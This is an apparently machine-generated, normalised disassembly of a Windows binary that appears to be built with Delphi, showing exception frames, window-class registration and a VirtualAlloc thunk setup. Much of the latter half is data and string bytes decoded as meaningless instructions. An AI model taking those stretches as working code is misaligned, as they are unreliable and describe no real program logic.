mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403bc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4220a8
lea eax [ ebp + 0xc ]
call sub_405b04
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403bc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_4220e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_422147
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422178
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418c64
mov edi eax
xor eax eax
push ebp
push sub_4221cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221d4
mov eax [ rw-data ]
call sub_418cc8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4188a0
call sub_403368
inc esi
dec ebx
jne r-xdata
sub_4221ec
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_422214
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028e8
mov edx sub_4221ec
lea eax [ esi + 0x5 ]
call sub_42220c
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_42220c
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_4222d0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406e8c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422214
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_422384
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4222ac
sub_4223ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422450
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422457
retn
mov eax [ rw-data ]
call sub_417e88
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_422178
xor edx edx
xor eax eax
call sub_41bc9c
mov eax rw-data
call sub_40d490
call sub_406234
lea eax [ eax + 0xc ]
call sub_40d490
mov eax rw-data
call sub_40d490
mov eax rw-data
call sub_405b04
mov eax sub_4221e4
call sub_4059a0
mov eax rw-data
call sub_40d490
call sub_4209ec
mov eax rw-data
call sub_40d490
mov eax rw-data
call sub_405b04
sub_42245c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4224e5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4224ec
retn
call sub_4209b8
mov eax sub_4221e4
call sub_405998
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d1d0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405b1c
mov dl 0x1
mov eax [ r-xdata ]
call sub_417784
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_4224f0
inc esi
dec eax
add [ esi + 0x640000ff ] cl
inc esi
dec eax
add [ edi + 0x640000ff ] cl
inc esi
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] dh
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] bh
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] ah
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] ch
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] dl
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] bl
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] al
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
inc esi
dec eax
add [ eax - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ edx - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ edi + edi * 8 ] cl
add [ esi + eax * 2 + 0x48 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ esi - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
inc esi
dec eax
add [ eax ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
inc esi
dec eax
add [ 0x640000ff ] dh
inc esi
dec eax
add [ esi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ ebx ] bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_422785
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42278c
retn
sub_42279c
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
cld
daa
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
daa
inc edx
add [ eax + eax ] cl
add [ eax ] al
int3
sub_422837
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jae r-xdata
popad
insd
nop
int3
push esp
inc esi
je r-xdata
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
js r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ecx + ebp + 0x70070042 ] dh
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
call 0x3426b11
or dl [ esi + eax * 2 + 0x6f ]
push esi
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
dec ecx
je r-xdata
popad
bound ebp [ ebp + 0x7 ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + ebp + 0x42 ] dh
add [ ecx ] cl
jo r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
sub [ edx ] al
mov eax eax
push eax
sub [ edx ] eax
add ecx [ ecx ]
push esp
push eax
outsb
push ebx
je r-xdata
in al 0x28
inc edx
add [ ebx + 0x422950c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
sub [ edx ] al
push es
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
je r-xdata
popa
jne r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
jo r-xdata
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
outsd
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2938c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ ecx + ebp + 0x42 ] cl
add [ edi ] al
jo r-xdata
outsd
inc esp
popad
jae r-xdata
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4228bc90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edi
jb r-xdata
cmp eax 0x540f0042
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
pop es
jb r-xdata
insd
outsd
jo r-xdata
mov eax eax
je r-xdata
inc edi
jb r-xdata
dec [ eax + 0x3d ]
inc edx
add [ edi ] cl
push esp
add [ eax ] al
add [ eax ] al
pushad
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub eax [ edx ]
dec esp
sub eax [ edx ]
sbb [ eax ] al
add [ eax ] al
fsub [ eax + 0x41 ]
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x4229b890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2b ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] al
jae r-xdata
shl [ edx + ebp + 0x42 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
jo r-xdata
pop es
jo r-xdata
add [ eax ] al
mov [ ebx ] ch
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
inc [ eax + 0x5004240 ]
push esp
inc esi
outsd
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
or al 0x2c
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub al 0x42
add [ esp + ebp ] bh
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x2b ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
nop
inc edi
cmp [ ebx ] ch
add [ eax ] bl
add [ eax ] al
add al bl
pushad
inc edx
jpe r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x2a74c08b
or [ eax + 0x6d ] esi
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
popad
inc edx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x2a ] dh
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
dec ebp
push eax
outsb
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
in al 0x28
inc edx
add [ esi ] al
popad
jb r-xdata
popad
jb r-xdata
sub al 0x42
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
sub al 0x42
add [ edx ] dh
sub al 0x42
cmp al 0x2c
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + edi + 0x2b ] si
inc edx
add [ ecx + 0x41 ] cl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
jo r-xdata
inc ecx
outsb
je r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x67ffbe72 ] cl
pop [ ecx ]
mov al [ 0xffffffffb400418f ]
mov es [ ecx ]
add [ eax ] eax
std
inc eax
add [ eax + 0x4035 ] ah
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
dec ebp
popad
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
pop esp
inc esp
inc edx
add [ eax + 0x44 ] bh
je r-xdata
popad
sub al 0x42
add [ ebx + ebp + 0x42 ] bl
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + eax ] ah
add [ eax ] al
in al dx
xor ch [ edx + eax * 2 ]
jo r-xdata
popad
imul esp [ ebx + 0x73 ] 0x422b3890
add [ ebx + ebp + 0x42 ] cl
insb
dec ebp
jb r-xdata
add [ ebx ] al
outsb
enter 0x4247 0x0
rol [ edi + 0x42 ] 0x1
imul esp [ ebx + 0x73 ] 0x27980004
inc edx
add [ esi + eax * 2 + 0x46c40042 ] bh
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax + eax * 2 + 0xe0042 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
daa
inc edx
add [ eax ] bl
add [ eax ] al
mov eax 0xe8004228
imul esp [ ebx + 0x73 ] 0x28c80007
inc edx
add [ eax ] al
inc ebp
inc edx
add [ eax ] cl
inc ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
inc ebx
inc edx
add [ eax ] al
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
je r-xdata
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x4228b874
add al ch
jo r-xdata
sub al [ edx ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
imul esp [ ebx + 0x73 ] 0xc08b0000
mov [ ebx ] gs
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
add [ eax ] al
jae r-xdata
pushfd
inc ebp
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov al [ 0x700422d ]
add al 0x54
push eax
outsb
mov [ 0x2b5c0042 ] ch
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x2e88c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422e ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp + 0x180042 ] dl
add [ eax ] al
in al dx
sub al [ edx ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + ecx * 2 ] bh
inc edx
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
dec eax
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
sub [ edx ] eax
sbb [ eax ] al
add bh bh
test [ edi + 0x42 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x4c65646f ] al
sub [ edx ] eax
cwde
inc edi
inc edx
add [ eax + 0x1004247 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add al cl
inc edi
inc edx
add al dl
inc edi
inc edx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
cwde
inc esp
inc edx
add [ esp + eax * 2 + 0x10042 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x6c797453 ] al
lea eax [ eax ]
mov [ 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x422d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x1c0042 ] dl
add [ eax ] al
in al dx
sub al [ edx ]
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + eax * 2 + 0x42 ] dh
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
inc edx
add al dl
inc esp
inc edx
add al bl
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x40 ] bl
inc edx
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
pushfd
inc eax
inc edx
inc eax
add [ ebx + esi ] bl
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax - 0x67ffbdb5 ] bh
pop [ ecx ]
mov al [ 0xffffffffb400418f ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2f ] dh
nop
mov al [ 0x700422e ]
push es
push esp
inc edx
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2000422b ] cl
jo r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x42 ] ah
jae r-xdata
add al 0x24
retn
outsd
cmp [ gs : edx + eax * 2 ] ch
add [ eax + eax ] cl
add bh bh
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
das
inc edx
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
jo r-xdata
mov [ esi ] ch
inc edx
